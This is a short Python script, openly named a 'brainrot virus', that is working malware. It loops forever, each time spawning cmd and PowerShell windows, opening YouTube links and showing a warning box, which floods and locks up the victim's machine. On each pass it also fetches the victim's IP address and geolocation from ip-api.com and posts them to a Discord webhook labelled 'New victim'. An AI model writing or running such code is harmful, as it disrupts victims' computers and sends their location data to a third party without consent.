import webbrowser
import subprocess
import tkinter
from tkinter import messagebox
import requests
from dhooks import Webhook

webhook_url = 'your webhook here'
hook = Webhook(webhook_url)

def sigma():
    sigmaboy = 'https://www.youtube.com/watch?v=_Gq9PeLLWSc'
    ilikethemyoung = 'https://www.youtube.com/watch?v=jjxD4goI6jg'

    webbrowser.open(sigmaboy)
    webbrowser.open(ilikethemyoung)

def msgbox():
    tkinter.messagebox.showwarning('PYVIRUS', 'IMAGINE GETTING VIRUSED BY THE BRAINROT VIRUS')

def getip():
    r = requests.get('https://ip-api.com/json') 
    hook.send(f'New victim > {r.json()} -> @here @everyone')

class Virus:
    def virus():
        subprocess.Popen('cmd')  
        subprocess.Popen('powershell')
        sigma() 
        msgbox()
        getip()

class Main:
    def main():
        while True:
            Virus.virus()  

if __name__ == "__main__":
    Main.main() 
